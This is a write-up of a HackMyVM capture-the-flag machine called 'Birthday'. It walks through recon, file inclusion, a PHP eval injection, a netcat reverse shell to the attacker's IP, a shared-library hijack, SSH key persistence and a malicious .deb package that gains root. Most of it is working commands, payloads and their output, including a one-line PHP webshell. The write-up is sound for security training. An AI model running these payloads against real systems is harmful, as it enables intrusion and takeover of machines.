# Birthday

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.147:22
Open 10.0.2.147:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.147
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Birthday
|_Requested resource was /index.php?event=birthday&date=3881678400
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/birthday/writeup.png)

Immediately checking for stego :D
```bash
â””â”€$ curl -LOs http://10.0.2.147/anniv.jpg
â””â”€$ stegseek anniv.jpg $rockyou
[!] error: Could not find a valid passphrase.
```

Future timestamp is used?
```bash
â””â”€$ date -d @3881678400 -u +%Y-%m-%dT%H:%M:%S%Z
2093-01-01T20:00:00UTC
```

:sigh:
```bash
â””â”€$ curl 'http://10.0.2.147/' -I
HTTP/1.1 302 Found
Date: Sat, 20 Dec 2025 06:25:24 GMT
Server: Apache/2.4.57 (Debian)
Location: /index.php?event=birthday&date=3881678400
Content-Type: text/html; charset=UTF-8

â””â”€$ curl 'http://10.0.2.147/index.php?event=birthday&date=3881678400' -I
HTTP/1.1 200 OK
Date: Sat, 20 Dec 2025 06:25:30 GMT
Server: Apache/2.4.57 (Debian)
Content-Type: text/html; charset=UTF-8

â””â”€$ curl 'http://10.0.2.147/index.php?event=birthday&date=birthday' -I
HTTP/1.1 302 Found
Date: Sat, 20 Dec 2025 06:25:35 GMT
Server: Apache/2.4.57 (Debian)
Location: /birthday_party_program.php
Content-Type: text/html; charset=UTF-8
```

![writeup-1.png](/assets/pentest/hackmyvm/birthday/writeup-1.png)

The calculator doesn't seem to have anything, just calculates dates, but positive it's not using shell commands :D

![writeup-2.png](/assets/pentest/hackmyvm/birthday/writeup-2.png)

### RFI

```bash
â””â”€$ curl 'http://10.0.2.147/birthday_party_program.php' -s | htmlq '*' -a href | sort | uniq
#
birthday_calculator.php
birthday_party_program.php?page=https://www.mcdonalds.com/
```

![writeup-3.png](/assets/pentest/hackmyvm/birthday/writeup-3.png)

```bash
â””â”€$ echo '<?php if(isset($_REQUEST[0])){system($_REQUEST[0]);}; ?>' > index.php
â””â”€$ php -S 0:80
[Sat Dec 20 01:33:15 2025] PHP 8.4.11 Development Server (http://0:80) started
```

Oops...

![writeup-4.png](/assets/pentest/hackmyvm/birthday/writeup-4.png)

### LFI

```bash
â””â”€$ curl 'http://10.0.2.147/birthday_party_program.php?page=/etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
chloe:x:1001:1001::/home/chloe:/bin/bash
netdata:x:999:996::/var/lib/netdata:/bin/sh
```

```php
â””â”€$ curl -s 'http://10.0.2.147/birthday_party_program.php?page=birthday_party_program.php'
<?php
    if(isset($_GET['page'])) {
        $file = $_GET['page'];

        // Check if the file name contains "php://", "data://", "expect://", or "php://input"
        if (stripos($file, 'php://') !== false || stripos($file, 'data://') !== false || stripos($file, 'expect://') !== false || stripos($file, 'php://input') !== false) {
            echo "The file cannot be included as it may contain malicious content.";
        } else {
            // Check if the file exists or if it's a valid URL
            if (file_exists($file) || filter_var($file, FILTER_VALIDATE_URL)) {
                echo file_get_contents($file);
            } else {
                echo "The file does not exist or the URL is not valid.";
            }
        }
    }
?>
```

```php
â””â”€$ curl -s 'http://10.0.2.147/birthday_party_program.php?page=birthday_calculator.php'
<?php
	if (isset($_GET['dob'])) {
		$dob = addslashes($_GET['dob']);
		eval("\$dob = \"$dob\";");

		$now = new DateTime();
		$nextBirthday = new DateTime($dob);
		$nextBirthday->setDate($now->format('Y'), $nextBirthday->format('m'), $nextBirthday->format('d'));

		if($nextBirthday < $now) {
			$nextBirthday->modify('+1 year');
		}

		$interval = $now->diff($nextBirthday);
		echo "<p>Your next birthday is in: ".$interval->days." days!</p>";
	}
?>
```

### RCE

:sigh: 
WHYYYY EVAL `eval("\$dob = \"$dob\";");`

```bash
â””â”€$ curl $'http://10.0.2.147/birthday_calculator.php' -G --data-urlencode 'dob=${system($_GET[0])}' --data-urlencode '0=id' -s | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
â””â”€$ curl $'http://10.0.2.147/birthday_calculator.php' -G --data-urlencode 'dob=${system($_GET[0])}' --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
---
â””â”€$ penelope -p 4444
www-data@birthday:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (chloe)

```bash
www-data@birthday:/var/www/html$ sudo -l
Matching Defaults entries for www-data on birthday:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on birthday:
    (chloe) NOPASSWD: /usr/bin/zodiac
```

```bash
www-data@birthday:/var/www/html$ file /usr/bin/zodiac
/usr/bin/zodiac: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fbd2403465577d479902c56c08fd41b61fee3ee8, for GNU/Linux 3.2.0, not stripped
```

```bash
www-data@birthday:/var/www/html$
[!] Session detached â‡² # Press F12

(Penelope)â”€(Session [3])> download /usr/bin/zodiac
[+] Download OK '/home/woyag/.penelope/sessions/birthday.hmv~10.0.2.147-Linux-x86_64/downloads/usr/bin/zodiac'
---
â””â”€$ mv /home/woyag/.penelope/sessions/birthday.hmv~10.0.2.147-Linux-x86_64/downloads/usr/bin/zodiac .
```

- [https://dogbolt.org/?id=472d2285-4357-4e7a-bf30-81f6770b62de#Hex-Rays=121&BinaryNinja=105&angr=44&Ghidra=4](https://dogbolt.org/?id=472d2285-4357-4e7a-bf30-81f6770b62de#Hex-Rays=121&BinaryNinja=105&angr=44&Ghidra=4)

![writeup-5.png](/assets/pentest/hackmyvm/birthday/writeup-5.png)

The program is using `get_zodiac_sign`, but it's defined nowhere in program.

Function is most likely imported from `libzodiac.so`
```bash
www-data@birthday:/var/www/html$ ldd /usr/bin/zodiac
        linux-vdso.so.1 (0x00007ffca6b29000)
        libzodiac.so => /lib/x86_64-linux-gnu/libzodiac.so (0x00007f3134d6e000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3134b8d000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f3134d7e000)
```

Writable by all
```bash
www-data@birthday:/var/www/html$ ls -l /lib/x86_64-linux-gnu/libzodiac.so
-rwxr-xrwx 1 root root 15096 Jul  6  2022 /lib/x86_64-linux-gnu/libzodiac.so
```

```bash
www-data@birthday:/var/www/html$ cp /lib/x86_64-linux-gnu/libzodiac.so /tmp
www-data@birthday:/var/www/html$ echo $'#include <stdlib.h>\nint get_zodiac_sign() { system("/bin/bash -p"); return 0; }' | gcc -x c - -shared -fPIC -o /lib/x86_64-linux-gnu/libzodiac.so

www-data@birthday:/var/www/html$ sudo -u chloe zodiac
Please enter your birth month (1-12): 1
Please enter your birth day (1-31): 2
chloe@birthday:/var/www/html$ id
uid=1001(chloe) gid=1001(chloe) groups=1001(chloe)
```

## SSH (chloe)

Upgrade persistence
```bash
â””â”€$ ssh-keygen -f id_rsa -P x -q
â””â”€$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINPSxs8aXBk4YBxCHHmfIw4pRaVP7rbhFL8nThj9hkL0 woyag@kraken' >> ~/.ssh/authorized_keys
---
chloe@birthday:~$ mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINPSxs8aXBk4YBxCHHmfIw4pRaVP7rbhFL8nThj9hkL0 woyag@kraken' >> ~/.ssh/authorized_keys
```

```bash
â””â”€$ ssh -i id_rsa chloe@10.0.2.147
chloe@birthday:~$ id
uid=1001(chloe) gid=1001(chloe) groupes=1001(chloe)
```

### User.txt

```bash
chloe@birthday:~$ cat user.txt
c3323a392febd72b386922bd115850ce
```

## Privilege Escalation

Some files in `/opt`
```bash
chloe@birthday:/opt$ find -ls
       19      4 drwxr-xr-x   3 root     root         4096 juil. 14  2023 .
       25      4 -rwxr-xr-x   1 root     root          357 juil.  2  2023 ./script.sh
   130561      4 drwxr-xrwx   2 root     root         4096 juil.  2  2023 ./packages
   130566     24 -rw-r--r--   1 root     root        23892 juil.  2  2023 ./packages/bacula-console_9.6.7-7_amd64.deb
   130564     36 -rw-r--r--   1 root     root        33800 juil.  2  2023 ./packages/airspy_1.0.10-2+b1_amd64.deb
   130563    480 -rw-r--r--   1 root     root       489972 juil.  2  2023 ./packages/abigail-doc_2.2-2_all.deb
   130562    160 -rw-r--r--   1 root     root       159976 juil.  2  2023 ./packages/aobook_1.0.3-3_amd64.deb
   130565   2596 -rw-r--r--   1 root     root      2654780 juil.  2  2023 ./packages/auto-07p_0.9.2+dfsg-3+b3_amd64.deb
```

```bash
chloe@birthday:/opt$ cat script.sh
#!/bin/bash

URL="http://ipv4.download.thinkbroadband.com/50MB.zip"
FILE="50MB.zip"

if [ -f "$FILE" ]; then rm "$FILE"; fi

START=$(date +%s.%N)
wget -O $FILE $URL
END=$(date +%s.%N)
DIFF=$(echo "$END - $START" | bc)
SIZE=$(du -b $FILE | cut -f1)
SPEED=$(echo "scale=2; ($SIZE*8/1000000)/$DIFF" | bc)

echo "Download speed : $SPEED Mbps"
rm "$FILE"
```

```bash
â””â”€$ scp -i id_rsa /opt/scripts/enum/pspy64 chloe@10.0.2.147:/tmp/pspy
chloe@birthday:~$ chmod +x /tmp/pspy
chloe@birthday:~$ /tmp/pspy
...
2025/12/20 08:05:17 CMD: UID=0     PID=20479  | /bin/sh -c chmod u+x /root/.ansible/tmp/ansible-tmp-1766214316.6448236-20460-172941479858831/ /root/.ansible/tmp/ansible-tmp-1766214316.6448236-20460-172941479858831/AnsiballZ_command.py && sleep 0
2025/12/20 08:05:18 CMD: UID=0     PID=20480  | ssh -C -o ControlMaster=auto -o ControlPersist=60s -o StrictHostKeyChecking=no -o KbdInteractiveAuthentication=no -o PreferredAuthentications=gssapi-with-mic,gssapi-keyex,hostbased,publickey -o PasswordAuthentication=no -o User="root" -o ConnectTimeout=10 -o ControlPath="/root/.ansible/cp/842df7d42c" -tt 127.0.0.1 /bin/sh -c '/usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1766214316.6448236-20460-172941479858831/AnsiballZ_command.py && sleep 0'
2025/12/20 08:05:18 CMD: UID=0     PID=20481  | sshd: root@pts/3,pts/1
2025/12/20 08:05:18 CMD: UID=0     PID=20482  | /bin/sh -c /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1766214316.6448236-20460-172941479858831/AnsiballZ_command.py && sleep 0
2025/12/20 08:05:19 CMD: UID=0     PID=20483  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1766214316.6448236-20460-172941479858831/AnsiballZ_command.py
2025/12/20 08:05:19 CMD: UID=0     PID=20484  | /bin/bash /opt/script.sh
2025/12/20 08:05:19 CMD: UID=0     PID=20486  | wget -O 50MB.zip http://ipv4.download.thinkbroadband.com/50MB.zip
2025/12/20 08:05:33 CMD: UID=0     PID=20487  | /bin/bash /opt/script.sh
2025/12/20 08:05:34 CMD: UID=0     PID=20490  | bc
2025/12/20 08:05:34 CMD: UID=0     PID=20497  | /bin/bash /opt/script.sh
2025/12/20 08:05:34 CMD: UID=0     PID=20498  | /bin/sh -c /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1766214262.8369625-20315-71401039705905/AnsiballZ_command.py && sleep 0
2025/12/20 08:05:34 CMD: UID=0     PID=20499  | /usr/bin/python3 /usr/bin/ansible-playbook /etc/ansible/install.yml
2025/12/20 08:05:34 CMD: UID=0     PID=20500  | sshd: root@pts/1
2025/12/20 08:05:34 CMD: UID=0     PID=20501  | /bin/sh -c rm -f -r /root/.ansible/tmp/ansible-tmp-1766214262.8369625-20315-71401039705905/ > /dev/null 2>&1 && sleep 0
...
2025/12/20 08:11:57 CMD: UID=0     PID=23077  | dpkg-deb --field -- /opt/packages/aobook_1.0.3-3_amd64.deb Package
2025/12/20 08:11:57 CMD: UID=0     PID=23080  | rm -rf -- /tmp/dpkg-deb.rw1KEK
2025/12/20 08:11:57 CMD: UID=0     PID=23081  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1766214710.8586981-22951-23250525616611/AnsiballZ_apt.py
2025/12/20 08:11:57 CMD: UID=0     PID=23083  | dpkg-deb --field -- /opt/packages/aobook_1.0.3-3_amd64.deb Version
...
```

The script is running periodically, but there's also `dpkg` checking version of packages in `/opt/packages` where we have write permissions ðŸ¤”

After careful look the ansible configuration which was used is readable
```bash
2025/12/20 08:26:41 CMD: UID=0     PID=28467  | /usr/bin/python3 /usr/bin/ansible-playbook /etc/ansible/install.yml
```

```yaml
chloe@birthday:/opt/packages$ cat /etc/ansible/install.yml
- hosts: clients
  tasks:

    - name: Run script /opt/script.sh
      ansible.builtin.command: /opt/script.sh

    - name: Install debian packages
      ansible.builtin.apt:
        deb: "/opt/packages/{{ item }}"
      loop:
        - abigail-doc_2.2-2_all.deb
        - airspy_1.0.10-2+b1_amd64.deb
        - aobook_1.0.3-3_amd64.deb
        - auto-07p_0.9.2+dfsg-3+b3_amd64.deb
        - bacula-console_9.6.7-7_amd64.deb

    - name: Copy /var/www/html to /var/backup/site.zip
      ansible.builtin.archive:
        path: /var/www/html
        dest: /var/backup/site.zip
...
```

- [https://gtfobins.github.io/gtfobins/dpkg/#sudo](https://gtfobins.github.io/gtfobins/dpkg/#sudo)

```bash
chloe@birthday:/opt/packages$ cp abigail-doc_2.2-2_all.deb /tmp
chloe@birthday:/opt/packages$ rm -f abigail-doc_2.2-2_all.deb
---
â””â”€$ gem install fpm
â””â”€$ TF=$(mktemp -d)
â””â”€$ echo 'exec install -m4777 /bin/bash /tmp/rootbash' > $TF/letmein.sh
â””â”€$ fpm -n x -s dir -t deb -a all --before-install $TF/letmein.sh $TF
â””â”€$ scp -i id_rsa x_1.0_all.deb chloe@10.0.2.147:/opt/packages/abigail-doc_2.2-2_all.deb
---
chloe@birthday:/opt/packages$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(chloe) gid=1001(chloe) euid=0(root) groupes=1001(chloe)
```

### Root.txt

```bash
rootbash-5.2# cat /root/root.txt
27ebd22f41640659d440a1b6ee0b0e09
```